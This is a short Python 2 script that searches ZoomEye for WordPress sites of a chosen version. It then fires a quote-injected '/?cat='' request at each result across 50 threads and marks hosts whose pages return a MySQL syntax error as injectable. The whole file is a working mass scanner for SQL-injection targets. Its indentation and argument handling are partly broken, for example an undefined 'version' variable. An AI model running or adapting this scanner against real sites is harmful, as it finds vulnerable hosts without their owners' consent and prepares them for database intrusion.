#!/usr/bin/env python
#search the wordpress version at the zoomeye,get the host url and test the exp.
#joey:joeyxy83@gmail.com create at 20140117

from threading import Thread
from Queue import Queue
from termcolor import colored
import urllib
import re
import sys
import httplib
import urllib2
from termcolor import colored


url_queue = Queue()


def showinfo():
	print "#########################################################"
	print "###                 search result                     ###"
	print "###  usage: python geturl.py keyword pagenumber       ###"
	print "###        ex: python geturl.py WordPress 1.5.1.1     ###"
	print "#########################################################"

def test():
	print "<h4><a href=\"(.*)\" target=\"_blank\""

def gethtml(url):
	page=urllib.urlopen(url)
	html=page.read()
	return html

def geturl(html):
	a="<h4><a href=\"(.*)\" target=\"_blank\""
	resp=re.findall(a,html)
	return resp

def check_url(i,url_q):
    print "the thread:%s" % i	
    while True:
        host=url_q.get()
        resource = "/?cat='"
        url=host+resource
        print "url is:%s" % url
        try:
            req = urllib2.Request(url)
            resp = urllib2.urlopen(req)
            resphtml = resp.read()
            found = re.search('You have an error in your SQL syntax',resphtml)
            if(found):
                print colored("Url:%s can access" % url,'green')
        except urllib2.HTTPError,e:
            print 'url:%s connection failed:%s' % (url,e)
            url_q.task_done()
        except :
            print 'other error.' 
            url_q.task_done()
        url_q.task_done()

def main(keywords,version,pagenum):
	num=0
	for x in range(1,int(pagenum)+1):
		html=gethtml('http://www.zoomeye.org/search?q=' + keywords +' '+version+ '&p=' + pagenum)
        #print html
        url=geturl(html)
        num+=len(url)
        for y in url:
			print y
			url_queue.put(y)
	print "total"+str(num)+"urls!"

	url_threads = 50
        if url_queue.qsize() < url_threads :
		url_threads = url_queue.qsize()

	for i in range(url_threads):
		worker = Thread(target=check_url,args=(i,url_queue))
		worker.setDaemon(True)
		worker.start()

	print "Main Thread waiting"
	url_queue.join()
	print "Done"

if __name__ == "__main__":
    if len(sys.argv) == 4:
        keywords=sys.argv[1]
        version =sys.argv[2]
        pagenum=sys.argv[3]
        main(keywords,version,pagenum)
    elif len(sys.argv) == 3:
		if sys.argv[1]=="-h" or sys.argv[1]=="--help":
			showinfo()
		else:
			keywords=sys.argv[1]
			pagenum=3
			main(keywords,version,pagenum)
    else:
		showinfo()

